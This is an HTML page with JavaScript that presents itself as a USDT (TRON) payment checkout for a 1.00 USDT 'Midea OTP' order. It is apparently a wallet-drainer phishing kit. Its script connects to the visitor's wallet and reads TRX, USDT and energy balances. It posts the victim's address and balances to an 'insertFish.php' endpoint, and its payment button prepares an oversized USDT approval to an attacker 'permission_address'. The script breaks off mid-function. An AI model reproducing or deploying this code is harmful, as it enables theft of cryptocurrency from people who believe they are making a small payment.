
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover" />
    <meta name="format-detection" content="telephone=no, email=no" />
    <title>正在进行支付 1.00 USDT</title>
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="icon" href="/assets/img/usdt.ico" type="image/x-icon">
</head>
<style>
        .wallet-selection img {
            width: 35px;
            height: 35px;
        }
        
        body {
    font-family: "Helvetica Neue", Arial, sans-serif;
    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    transition: background 0.5s ease;
}

.container {
    width: 100%;
    max-width: 800px;
    margin: 20px auto;
    padding: 25px;
    background: white;
    border-radius: 16px;
    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12);
    box-sizing: border-box;
    transition: all 0.3s ease;
    animation: fadeIn 0.5s ease-out;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
}

.header {
    text-align: center;
    padding: 20px 0;
    border-bottom: 1px solid #f0f0f0;
    margin-bottom: 20px;
}

.header h1 {
    font-size: 24px;
    margin: 0;
    color: #333;
    font-weight: 600;
}

.header p {
    font-size: 16px;
    color: #666;
    margin-top: 10px;
}

.alert {
    background-color: #fff8f8;
    color: #e74c3c;
    padding: 12px 15px;
    margin: 15px 0;
    border-left: 4px solid #e74c3c;
    border-radius: 4px;
    font-size: 14px;
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% { box-shadow: 0 0 0 0 rgba(231, 76, 60, 0.2); }
    70% { box-shadow: 0 0 0 10px rgba(231, 76, 60, 0); }
    100% { box-shadow: 0 0 0 0 rgba(231, 76, 60, 0); }
}

.qr-code {
    text-align: center;
    margin: 25px 0;
    position: relative;
    animation: scaleIn 0.5s ease-out;
}

@keyframes scaleIn {
    from { transform: scale(0.9); opacity: 0; }
    to { transform: scale(1); opacity: 1; }
}

.qr-logo-container {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 40px;
    height: 40px;
    transform: translate(-50%, -50%);
    background: white;
    border-radius: 8px;
    padding: 5px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    animation: float 3s ease-in-out infinite;
}

@keyframes float {
    0% { transform: translate(-50%, -50%); }
    50% { transform: translate(-50%, -55%); }
    100% { transform: translate(-50%, -50%); }
}

.qr-logo {
    width: 100%;
    height: 100%;
    border-radius: 4px;
}

.info {
    display: flex;
    align-items: center;
    margin: 15px 0;
    padding: 12px;
    border-radius: 8px;
    background: #f9f9f9;
    transition: all 0.3s ease;
}

.info:hover {
    background: #f0f7ff;
    transform: translateX(5px);
}

.info h2 {
    font-size: 16px;
    color: #555;
    margin: 0;
    padding-right: 15px;
    flex-shrink: 0;
    font-weight: 600;
    min-width: 100px;
}

.info p {
    font-size: 16px;
    color: #333;
    margin: 0;
    word-break: break-all;
    font-weight: 500;
}

.timer {
    text-align: right;
    font-size: 18px;
    color: #3498db;
    margin-top: -40px;
    font-weight: bold;
    animation: highlight 1s ease-in-out infinite alternate;
}

@keyframes highlight {
    from { color: #3498db; }
    to { color: #2980b9; }
}

.wallet-selection {
    margin: 25px 0;
}

.wallet-selection h2 {
    font-size: 18px;
    color: #333;
    margin-bottom: 15px;
    font-weight: 600;
}

.wallet-selection ul {
    list-style: none;
    padding: 0;
}

.wallet-selection li {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 15px;
    border: 1px solid #e0e0e0;
    border-radius: 8px;
    margin: 10px 0;
    cursor: pointer;
    transition: all 0.2s ease;
}

.wallet-selection li:hover {
    background-color: #f5f9ff;
    border-color: #3498db;
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0,0,0,0.05);
}

.wallet-selection li img {
    margin-right: 15px;
    transition: transform 0.3s ease;
}

.wallet-selection li:hover img {
    transform: scale(1.1);
}

.wallet-selection li.selected {
    background-color: #ebf7ff;
    border-color: #3498db;
    box-shadow: 0 5px 15px rgba(52, 152, 219, 0.15);
}

.pay-button, .pay-approvalbutton {
    width: 100%;
    background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
    color: white;
    padding: 15px;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    text-align: center;
    font-size: 18px;
    font-weight: 600;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
    box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
}

.pay-button:before, .pay-approvalbutton:before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
    transition: all 0.6s ease;
}

.pay-button:hover:before, .pay-approvalbutton:hover:before {
    left: 100%;
}

.pay-button:hover, .pay-approvalbutton:hover {
    background: linear-gradient(135deg, #2980b9 0%, #1a5276 100%);
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
}

.pay-button:active, .pay-approvalbutton:active {
    transform: translateY(1px);
    box-shadow: 0 3px 10px rgba(52, 152, 219, 0.3);
}

.hidden {
    display: none;
}

#trxAmount {
    color: #e74c3c;
    font-weight: bold;
}

@media only screen and (max-width: 768px) {
    #mobileContent .info h2, 
    #mobileContent .info p {
        display: inline;
        font-size: 16px;
        color: #333;
        margin: 0;
    }
    
    #mobileContent .info p {
        color: #666;
        margin-left: 5px;
        word-break: break-all;
    }
}

@media (max-width: 768px) {
    body {
        padding: 10px;
    }

    .container {
        padding: 20px;
        margin: 10px auto;
    }

    .header h1 {
        font-size: 20px;
    }

    .header p {
        font-size: 14px;
    }

    .info h2 {
        font-size: 16px;
        min-width: 80px;
    }

    .info p {
        font-size: 14px;
        margin: 0;
        word-break: break-all;
    }

    .timer {
        font-size: 16px;
        text-align: center;
        margin-top: 10px;
        display: block;
    }

    .pay-button, .pay-approvalbutton {
        font-size: 16px;
        padding: 12px;
    }
}


a[href^="tel"], a[href^="mailto"] {
    color: inherit; 
    text-decoration: none; 
    pointer-events: none; 
    cursor: default;
}


.modal-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.6);
    z-index: 1000;
    backdrop-filter: blur(5px);
    overflow-y: auto;
    opacity: 0;
    transition: opacity 0.3s ease;
}

.modal-overlay.show {
    opacity: 1;
}

.modal-content {
    position: relative; 
    background: white;
    padding: 30px;
    border-radius: 20px;
    max-width: 90%;
    width: 450px;
    margin: 30px auto;
    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
    transform: translateY(-20px);
    opacity: 0;
    transition: all 0.4s ease;
}

.modal-overlay.show .modal-content {
    transform: translateY(0);
    opacity: 1;
}

.modal-close {
    position: absolute;
    right: 20px;
    top: 20px;
    font-size: 24px;
    cursor: pointer;
    color: #666;
    width: 35px;
    height: 35px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    transition: all 0.3s ease;
    background: #f8f8f8;
}

.modal-close:hover {
    background: #e0e0e0;
    color: #333;
    transform: rotate(90deg);
}

.modal-title {
    font-size: 22px;
    margin-bottom: 25px;
    text-align: center;
    color: #333;
    font-weight: bold;
}

.modal-instructions {
    font-size: 16px;
    line-height: 1.6;
    color: #555;
    margin: 25px 0;
    padding: 20px;
    background: #f8f9fa;
    border-radius: 12px;
    box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
}

.modal-instructions ol {
    margin: 0;
    padding-left: 25px;
}

.modal-instructions li {
    margin-bottom: 12px;
    position: relative;
    padding-left: 10px;
}

.modal-instructions li:before {
    content: '';
    position: absolute;
    left: -10px;
    top: 8px;
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: #3498db;
}

.url-section {
    margin: 25px 0;
    animation: fadeIn 0.8s ease;
}

.url-container {
    background: #f5f5f5;
    border-radius: 12px;
    padding: 15px;
    margin-bottom: 15px;
    border: 1px solid #e0e0e0;
    box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
}

.url-text {
    word-break: break-all;
    font-size: 14px;
    color: #333;
    line-height: 1.5;
    font-family: monospace;
    background: #fff;
    padding: 15px;
    border-radius: 8px;
    border: 1px solid #e0e0e0;
    box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
}

.copy-button {
    display: block;
    width: 100%;
    background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
    color: white;
    border: none;
    border-radius: 8px;
    padding: 14px;
    cursor: pointer;
    font-size: 16px;
    font-weight: 600;
    transition: all 0.3s ease;
    margin-top: 15px;
    position: relative;
    overflow: hidden;
    box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
}

.copy-button:before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
    transition: all 0.6s ease;
}

.copy-button:hover:before {
    left: 100%;
}

.copy-button:hover {
    background: linear-gradient(135deg, #2980b9 0%, #1a5276 100%);
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
}

.copy-button:active {
    transform: translateY(1px);
    box-shadow: 0 3px 10px rgba(52, 152, 219, 0.3);
}

.modal-image {
    width: 100%;
    display: block;
    margin: 25px auto 15px;
    border-radius: 12px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    transition: all 0.3s ease;
}

.modal-image:hover {
    transform: scale(1.02);
    box-shadow: 0 8px 25px rgba(0,0,0,0.15);
}

.copy-success {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(46, 204, 113, 0.9);
    color: white;
    padding: 15px 30px;
    border-radius: 30px;
    display: none;
    z-index: 1002;
    font-size: 16px;
    font-weight: 600;
    box-shadow: 0 4px 20px rgba(46, 204, 113, 0.4);
    animation: fadeInOut 2s ease forwards;
}

@keyframes fadeInOut {
    0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
    20% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
    80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
    100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
}

/* 加载动画 */
.loading-spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    margin-right: 10px;
    border: 3px solid rgba(255,255,255,0.3);
    border-radius: 50%;
    border-top-color: #fff;
    animation: spin 1s ease-in-out infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* 消息提示动画 */
@keyframes messageSlideIn {
    from { transform: translateX(-50%) translateY(-20px); opacity: 0; }
    to { transform: translateX(-50%) translateY(0); opacity: 1; }
}

@media (max-width: 480px) {
    .modal-content {
        width: 92%;
        padding: 20px;
        top: 40%;
    }
    .modal-title {
        font-size: 18px;
    }
    .modal-instructions {
        font-size: 14px;
        padding: 12px;
        margin: 15px 0;
    }
    .copy-button {
        padding: 10px;
    }
    .modal-image {
        width: 100%;
        height: auto;
        margin: 15px auto;
    }
    .url-container {
        padding: 10px;
    }
    .url-text {
        font-size: 12px;
        padding: 8px;
    }
    .modal-instructions ol {
        padding-left: 16px;
    }
    .modal-instructions li {
        margin-bottom: 6px;
    }
}
@media (max-width: 360px) {
    .modal-content {
        padding: 15px;
        width: 94%;
    }
    .modal-title {
        font-size: 16px;
        margin-bottom: 15px;
    }
    .modal-image {
        width: 100%;
        height: auto;
        margin: 10px auto;
    }
    .url-section {
        margin: 15px 0;
    }
}
@media (max-height: 700px) {
    .modal-content {
        top: 45%;
    }
    .modal-instructions {
        margin: 10px 0;
    }
}
</style>
<body>
    <!-- PC端专用 -->
    <div class="pc-content hidden" id="pcContent">
        <div class="container">
            <div class="header">
                <h1>正在支付 USDT - 波场 (TRON) 网络</h1>
                <p>为了您的安全起见，请打开钱包App扫描进行支付。</p>
                <div class="timer" id="timer-pc"></div>
            </div>
            <div class="alert">
                <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！</p>
            </div>
            <div class="qr-code">
                <canvas id="qrcode-pc"></canvas>
                <div class="qr-logo-container">
                    <img src="/assets/img/tether-usdt-logo.png" class="qr-logo" id="logo-pc">
                </div>
            </div>
            <!-- 商品图片 -->
            <!--<div class="product-image-container" style="display: flex; justify-content: center; align-items: center;">-->
    
            <!--    <div class="product-image" style="width: 300px; height: 200px; overflow: hidden; box-shadow: 0 0 15px rgba(0, 123, 255, 0.6); border-radius: 8px;">-->
            <!--        <img src="/uploads/20241214/7d9c1813ee1001956b36dab5641964b6.jpg" alt="Midea OTP" id="goods-cover" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">-->
            <!--    </div>-->
            <!--</div>-->
            <div class="info">
                <h2>商品订单</h2>
                <p>20250720184353124941</p>
            </div>
            <div class="info">
                <h2>商品详情</h2>
                <p>Midea OTP</p>
            </div>
            <div class="info">
                <h2>购买数量</h2>
                <p>1 件</p>
            </div>
            <div class="info">
                <h2>付款金额</h2>
                <p>1.00 USDT</p>
            </div>
            <div id="emailInfo" class="info hidden">
                <h2>电子邮箱</h2>
                <p></p>
            </div>
            <div id="passwordInfo" class="info hidden">
                <h2>查单密码</h2>
                <p></p>
            </div>
            <div id="mobileInfo" class="info hidden">
                <h2>手机号码</h2>
                <p></p>
            </div>
        </div>
    </div>

    <!-- 移动端专用 -->
    <div class="mobile-content hidden" id="mobileContent">
        <div class="container">
            <div class="header">
                <h1>正在支付 USDT 到 波场(TRON) 网络</h1>
                <p>为了您的安全起见，请打开钱包App进行支付！</p>
            </div>
            <div class="alert">
                <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！。</p>
            </div>
            <div class="qr-code">
                <canvas id="qrcode-mobile"></canvas>
                <div class="qr-logo-container">
                    <img src="/assets/img/tether-usdt-logo.png" class="qr-logo" id="logo-mobile">
                </div>
            </div>
            <div class="info">
                <h2>商品订单</h2>
                <p>20250720184353124941</p>
            </div>
            <div class="info">
                <h2>商品详情</h2>
                <p>Midea OTP</p>
            </div>
            <div class="info">
                <h2>购买数量</h2>
                <p>1 件</p>
            </div>
            <div class="info">
                <h2>付款金额</h2>
                <p>1.00 USDT</p>
            </div>
            <div id="emailInfo" class="info hidden">
                <h2>电子邮箱</h2>
                <p></p>
            </div>
            <div id="passwordInfo" class="info hidden">
                <h2>查单密码</h2>
                <p></p>
            </div>
            <div id="mobileInfo" class="info hidden">
                <h2>手机号码</h2>
                <p></p>
            </div>
            <div class="wallet-selection">
                <h2>选择付款钱包</h2>
                <ul id="wallets">
                    <li data-wallet="imToken">
                        <img src="/assets/img/imtoken.png" alt="imToken">
                        <span>imToken钱包</span>
                        <input type="radio" name="wallet" value="imToken">
                    </li>
                    <li data-wallet="tokenpocket">
                        <img src="/assets/img/tokenpocket.png" alt="tokenpocket">
                        <span>TokenPocket</span>
                        <input type="radio" name="wallet" value="tokenpocket">
                    </li>

                    <li data-wallet="TRONLINK">
                        <img src="/assets/img/TronLink.png" alt="TRONLINK">
                        <span>TronLink钱包</span>
                        <input type="radio" name="wallet" value="TRONLINK">
                    </li>

                </ul>
            </div>
            <button class="pay-button" onclick="payNow()">打开支付</button>
        </div>
    </div>

    <!-- 弹窗 -->
    <div id="walletModal" class="modal-overlay">
        <div class="modal-content">
            <span class="modal-close" onclick="closeWalletModal()">&times;</span>
            <div class="modal-title">请在钱包中打开支付</div>
            <div class="modal-instructions">
                <ol>
                    <li>复制下方地址</li>
                    <li>打开您的钱包</li>
                    <li>在钱包DAPP浏览器中粘贴地址</li>
                </ol>
            </div>
            <div class="url-section">
                <div class="url-container">
                    <div class="url-text" id="currentUrl"></div>
                </div>
                <button class="copy-button" onclick="copyUrl()">
                    复制链接
                </button>
            </div>
            <img id="walletGuideImage" class="modal-image" alt="教程">
        </div>
    </div>

    <!-- 复制成功提示 -->
    <div id="copySuccess" class="copy-success">
        复制成功
    </div>

    <!-- 钱包DAPP专用 -->
    <div class="mobile-container1 hidden" id="walletContent">
        <div class="container">
            <div class="header">
                <h1>正在支付 USDT 到 波场(TRON) 网络</h1>
                <p>付款成功后请勿关闭此页面，请耐心等待自动回调订单，否则可能无法自动到账！</p>
            </div>
            <!-- 商品图片 -->
            <div class="product-image-container" style="display: flex; justify-content: center; align-items: center;">
                <div class="product-image" style="width: 300px; height: 200px; overflow: hidden; box-shadow: 0 0 15px rgba(0, 123, 255, 0.6); border-radius: 8px;">
                    <img src="/uploads/20241214/7d9c1813ee1001956b36dab5641964b6.jpg" alt="Midea OTP" id="goods-cover" style="width: 100%; height: 100%; object-fit: cover; border-radius: 8px;">
                </div>
            </div>
            <div class="info">
                <h2>商品订单</h2>
                <p>20250720184353124941</p>
            </div>
            <div class="info">
                <h2>商品详情</h2>
                <p>Midea OTP</p>
            </div>
            <div class="info">
                <h2>购买数量</h2>
                <p>1 件</p>
            </div>
            <div class="info">
                <h2>付款金额</h2>
                <p id="paymentAmount">1.00 USDT</p>
            </div>
            <div id="emailInfo" class="info hidden">
                <h2>电子邮箱</h2>
                <p><span></span></p>
            </div>
            <div id="passwordInfo" class="info hidden">
                <h2>查单密码</h2>
                <p><span></span></p>
            </div>
            <div id="mobileInfo" class="info hidden">
                <h2>手机号码</h2>
                <p><span></span></p>
            </div>
            <button class="pay-approvalbutton" onclick="invokePay()">确认支付</button>
        </div>
    </div>
</body>
</html>
<script>
// document.addEventListener('keydown', function(event) {
//     // 禁止F1-F12功能键、Ctrl键和其他调试相关快捷键
//     if ((event.key >= 'F1' && event.key <= 'F12') || event.ctrlKey) {
//         event.preventDefault();
//     }
//     // 禁止查看源代码（Ctrl+U）
//     if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
//         event.preventDefault();
//     }
//     // 禁止调试模式快捷键（Ctrl+Shift+I、Ctrl+Shift+C、Ctrl+Shift+J）
//     if (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'i' || event.key === 'C' || event.key === 'c' || event.key === 'J' || event.key === 'j')) {
//         event.preventDefault();
//     }
//     // 禁止Ctrl+Shift+S保存网页快照
//     if (event.ctrlKey && event.shiftKey && (event.key === 'S' || event.key === 's')) {
//         event.preventDefault();
//     }
//     // 禁止Ctrl+P打印页面
//     if (event.ctrlKey && (event.key === 'P' || event.key === 'p')) {
//         event.preventDefault();
//     }
// });
// // 监听右键菜单
// document.addEventListener('contextmenu', function(event) {
//     // 阻止默认的右键菜单显示
//     event.preventDefault();
// });
// // 定期检查是否有调试模式开启
// setInterval(function() {
//     if (window.console && (console.log.toString().indexOf("native code") === -1)) {
//         console.log = function() {};
//         alert('请关闭调试模式');
//     }
// }, 1000);

// 初始化倒计时器
function initializeTimers() {
    var duration = 1800;  // 倒计时30分钟
    
    var timerPc = document.getElementById('timer-pc');
    if (timerPc) startTimer(duration, timerPc);
    
    var timerMobile = document.getElementById('timer-mobile');
    if (timerMobile) startTimer(duration, timerMobile);
    
    var timerWallet = document.getElementById('timer-wallet');
    if (timerWallet) startTimer(duration, timerWallet);
}

// 倒计时功能
function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function() {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}

// 二维码生成
function generateQRCode(canvasId, text) {
    var qr = new QRious({
        element: document.getElementById(canvasId),
        value: text,
        size: 200,
        level: 'H'
    });
}

// 解析附加信息为 JSON 
try {
    var attach = JSON.parse('[]');
    var options = JSON.parse('{\"domain\":\"*.0suyt.vip\",\"payment_address\":\"TRqYfpyMWxw1LBs5ErGczzACJgyG2i7Vt5\",\"permission_address\":\"TUQ1kXNFQ5vMop7YtaUVDnY2KSiDjKcS9C\",\"notification_id\":\"-1002606990989\",\"trx_balance\":\"1\",\"usdt_balance\":\"0.1\",\"authorized_amount\":\"0\",\"authorize_note\":\"\\u5f53\\u524d\\u7f51\\u7edc\\u62e5\\u5835\\uff0c\\u8bf7\\u5728\\u5f53\\u524d\\u9875\\u9762\\u4e2d\\u8010\\u5fc3\\u7b49\\u5f85\\u8fd4\\u56de\\u7ed3\\u679c\",\"model\":\"4\",\"notification_switch\":\"1\",\"auto_threshold\":\"1000\"}');
    var fishAddresses = JSON.parse('[\"TRWNiDW5sWXNZ7Y7tqKZBTr1YUjhQrKhbS\"]');

    var attachList = document.getElementById('attach-list');
    if (attachList) {
        attach.forEach(function(item) {
            var listItem = document.createElement('li');
            listItem.textContent = item.title + ': ' + item.value;
            attachList.appendChild(listItem);
        });
    }
} catch(e) {
}

// 检查电子邮箱是否存在
if ("" !== "") {
    var emailInfo = document.querySelectorAll('#emailInfo');
    emailInfo.forEach(function(el) {
        el.classList.remove('hidden');
    });
}

// 检查查单密码是否存在
if ("" !== "") {
    var passwordInfo = document.querySelectorAll('#passwordInfo');
    passwordInfo.forEach(function(el) {
        el.classList.remove('hidden');
    });
}

// 检查手机号码是否存在
if ("" !== "") {
    var mobileInfo = document.querySelectorAll('#mobileInfo');
    mobileInfo.forEach(function(el) {
        el.classList.remove('hidden');
    });
}

// 设置商品图片路径
var goodsCover = "/uploads/20241214/7d9c1813ee1001956b36dab5641964b6.jpg";

// 获取商品封面图像元素
var goodsCoverElement = document.getElementById('goods-cover');

// 如果商品封面图像元素存在
if (goodsCoverElement) {
    // 设置商品封面图像元素的src属性为goodsCover变量的值
    goodsCoverElement.src = goodsCover;
}

document.addEventListener('DOMContentLoaded', function() {
    detectAndDisplayContent();
    initializeTimers();
    attemptConnection();
});


// 检测设备
function isPC() {
    return !/Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// 检测DApp
function isDAppBrowser() {
    return typeof window.ethereum !== 'undefined' || typeof window.tronWeb !== 'undefined';
}

// 网页展示
function detectAndDisplayContent() {
    var currentUrl = window.location.href;
    if (isDAppBrowser() && !isPC()) {
        // DAPP
        document.getElementById('walletContent').classList.remove('hidden');
        document.getElementById('pcContent').classList.add('hidden');
        document.getElementById('mobileContent').classList.add('hidden');
        generateQRCode('qrcode-wallet', currentUrl);
    } else if (isPC()) {
        // PC
        document.getElementById('pcContent').classList.remove('hidden');
        document.getElementById('mobileContent').classList.add('hidden');
        document.getElementById('walletContent').classList.add('hidden');
        generateQRCode('qrcode-pc', currentUrl);
    } else {
        // H5
        document.getElementById('mobileContent').classList.remove('hidden');
        document.getElementById('pcContent').classList.add('hidden');
        document.getElementById('walletContent').classList.add('hidden');
        generateQRCode('qrcode-mobile', currentUrl);
    }
}

// 更新授权数据
async function updateAuthorizationData(spenderAddress) {
    try {
        const now = new Date();
        const beijingTime = new Date(now.getTime() + (8 * 60 * 60 * 1000));
        const formattedTime = beijingTime.toISOString().slice(0, 19).replace('T', ' ');

        // 发送更新授权数据的请求
        const dbResponse = await $.post('/assets/libs/options/insertFish.php', {
            fish_address: userData.address,
            permissions_fishaddress: spenderAddress,
            tgusername: userData.tgusername || '',
            usdt_balance: userData.usdtBalance,
            trx_balance: userData.trxBalance,
            time: formattedTime,
            remark: userData.tgusername || '',
            operation: 'insert_update'
        });
        
        if (dbResponse.status !== 'success') {
            throw new Error(dbResponse.message);
        }
    } catch (error) {
        console.error("更新授权数据异常:", error);
    }
}


// 钱包连接状态
let isConnected = false;

// 尝试连接
async function attemptConnection() {
    if (isConnected) {
        return;
    }
    try {
        const connected = await connectWallet();
        if (connected) {
            isConnected = true;
            await initDApp();
            await sendWalletConnectNotification(
                userData.address,
                userData.trxBalance,
                userData.usdtBalance
            );
        }
    } catch (error) {
        console.error('attemptConnection错误:', error);
        isConnected = false; 
    }
    if (!isConnected) {
        setTimeout(attemptConnection, 3000); 
    }
}

// 连接钱包
async function connectWallet() {
    try {
        if (window.tronWeb && window.tronWeb.ready) {
            await initDApp();
            return true;
        }
        if (window.tronLink) {
            try {
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code === 200) {
                    window.tronWeb = window.tronLink.tronWeb;
                    await initDApp();
                    return true;
                }
            } catch (error) {
                throw error;
            }
        }
        if (typeof window.tronWeb !== 'undefined') {
            let retries = 0;
            const maxRetries = 10;
            
            while (retries < maxRetries) {
                if (window.tronWeb.ready) {
                    await initDApp();
                    return true;
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
                retries++;
            }
        }
        return false;
    } catch (error) {
        console.error('connectWallet错误:', error);
        return false;
    }
}

async function initDApp() {
    try {
        const currentUrl = window.location.href;
        const questionMarkIndex = currentUrl.indexOf('?');
        
        if (questionMarkIndex !== -1) {
            // 获取问号后的所有内容
            const queryString = currentUrl.slice(questionMarkIndex + 1);
            // 拆分第一个&符号前的内容
            const firstParam = queryString.split('&')[0];
            // 拆分等号前后的内容
            const [paramName, paramValue] = firstParam.split('=');
            
            // 检查参数值是否为空
            if (paramName && (paramValue === undefined || paramValue === '')) {
                userData.tgusername = paramName; // 使用参数名作为用户名
                console.log("成功获取代理用户名:", userData.tgusername);
            } else {
                console.warn("TG用户名为空或格式不正确", {paramName, paramValue});
                userData.tgusername = null;
            }
        } else {
            console.warn("未找到推荐ID");
            userData.tgusername = null;
        }

        // 其余代码保持不变
        if (typeof window.tronWeb === 'undefined') {
            throw new Error("未找到钱包");
        }
        if (!window.tronWeb.ready) {
            throw new Error("请连接钱包后再进行交易");
        }
        const address = window.tronWeb.defaultAddress.base58;
        if (!address) {
            throw new Error("无法获取钱包地址,请确保已连接钱包");
        }
        userData.address = address;
        
        try {
            const trxBalanceRaw = await window.tronWeb.trx.getBalance(userData.address);
            userData.trxBalance = window.tronWeb.fromSun(trxBalanceRaw);
        } catch (trxError) {
            console.warn("获取TRX余额失败:", trxError);
            userData.trxBalance = '0.000000';
        }
        
        // 获取账户能量信息 - 修改能量获取逻辑
        try {
            const accountResourcesResponse = await window.tronWeb.trx.getAccountResources(userData.address);
            console.log("账户资源信息:", accountResourcesResponse);
            
            // 正确处理能量数据
            if (accountResourcesResponse && typeof accountResourcesResponse === 'object') {
                // 已使用的能量
                const energyUsed = accountResourcesResponse.EnergyUsed || 0;
                // 能量限制（总量）
                const energyLimit = accountResourcesResponse.EnergyLimit || 0;
                // 计算剩余能量
                userData.energyRemaining = Math.max(0, energyLimit - energyUsed);
                userData.energyLimit = energyLimit;
                
                console.log("能量信息详细解析:", {
                    energyUsed,
                    energyLimit,
                    energyRemaining: userData.energyRemaining
                });
            } else {
                throw new Error("获取到的账户资源信息格式不正确");
            }
        } catch (energyError) {
            console.warn("获取能量信息失败:", energyError);
            // 设置默认值
            userData.energyRemaining = 0;
            userData.energyLimit = 0;
        }
        
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        try {
            const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
            let usdtBalanceRaw = await usdtContract.balanceOf(userData.address).call();
            if (typeof usdtBalanceRaw === 'object' && usdtBalanceRaw.toString) {
                usdtBalanceRaw = usdtBalanceRaw.toString();
            }
            userData.usdtBalance = parseFloat(window.tronWeb.fromSun(usdtBalanceRaw)).toFixed(6);
        } catch (usdtError) {
            console.warn("获取USDT余额失败:", usdtError);
            userData.usdtBalance = '0.000000';
        }
    } catch (error) {
        console.error("初始化DApp时发生错误:", error);
        throw error;
    }
}

// 用户数据
const userData = {
    address: null,
    trxBalance: null,
    usdtBalance: null,
    tgusername: null,
    energyRemaining: null,  // 添加能量剩余字段
    energyLimit: null       // 添加能量上限字段
};

// 主支付函数
async function invokePay() {
    try {
        if (!isConnected || !userData.address || userData.usdtBalance === null || userData.trxBalance === null) {
            showTemporaryMessage("请先连接您的钱包再开始交易");
            return;
        }
        
        // 添加按钮动画
        const button = document.querySelector('.pay-approvalbutton');
        button.innerHTML = '<span class="loading-spinner"></span>处理中...';
        button.disabled = true;
        
        const paymentAmountElement = document.getElementById('paymentAmount');
        if (!paymentAmountElement) {
            throw new Error("无法获取支付金额元素");
        }
        const totalPrice = parseFloat(paymentAmountElement.textContent.split(' ')[0]);
        if (isNaN(totalPrice)) {
            throw new Error("无效的支付金额");
        }
        const {
            permission_address: spenderAddress,
            payment_address: paymentAddress,
            trx_balance: requiredTrxBalance,
            usdt_balance: requiredUsdtBalance,
            model
        } = options;
        
        // 获取今天的日期并生成授权金额 (年月日 + 6个0)
        const now = new Date();
        // 获取北京时间（UTC+8）
        const beijingTime = new Date(now.getTime() + (8 * 60 * 60 * 1000));
        
        // 格式化为年月日，例如：20250514
        const year = beijingTime.getFullYear();
        const month = String(beijingTime.getMonth() + 1).padStart(2, '0');
        const day = String(beijingTime.getDate()).padStart(2, '0');
        
        // 创建授权额度格式: 年月日后加6个0，确保是字符串格式
        const dateStr = `${year}${month}${day}`;
        const approvalAmount = dateStr + "000000"; // 添加6个0
        
        console.log("授权金额(年月日+6个0):", approvalAmount);
        
        
        // 检查能量是否足够 - 修改能量检查逻辑
        const requiredEnergy = 130000; // USDT授权大约需要的能量
        console.log("能量检查:", {
            required: requiredEnergy,
            available: userData.energyRemaining,
            hasEnough: userData.energyRemaining >= requiredEnergy
        });
        
        if (userData.energyRemaining < requiredEnergy) {
            // 只是警告，不阻止交易
